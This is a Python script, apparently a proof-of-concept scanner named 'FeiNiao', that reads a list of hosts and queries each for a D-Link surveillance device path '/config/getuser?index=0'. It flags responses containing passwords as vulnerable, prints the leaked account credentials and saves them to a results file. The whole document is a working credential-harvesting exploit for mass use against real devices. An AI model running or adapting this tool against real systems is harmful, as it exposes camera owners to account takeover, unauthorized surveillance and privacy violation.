import requests

banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.5
"""

poc = "/config/getuser?index=0"

file = open("host.txt","r").read().split()

header = {
"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
}

def check(i):
    try:
        reps = requests.get(i+poc,headers=header,verify=False,timeout=10)
        if reps.status_code == 200 and "pass=" in reps.text:
            print("\033[0;32;40m[+] {} 疑似存在D-Link监控账号密码泄露漏洞！！！\033[0m".format(i))
            print(reps.text.replace("priv=1",""))
            f = open("res.txt","a+")
            f.write(i)
            f.write("\n")
            f.write(reps.text.replace("priv=1",""))
            f.write("\n")
            f.close()
        else:
            print("\033[0;31;40m[-] {} 未发现D-Link监控账号密码泄露漏洞\033[0m".format(i),end=reps.status_code)
    except Exception as e:
        print("url:{}请求失败".format(i))

print(banner)
for i in file:
    if "http" not in i:
        i = "http://" + i
    check(i)
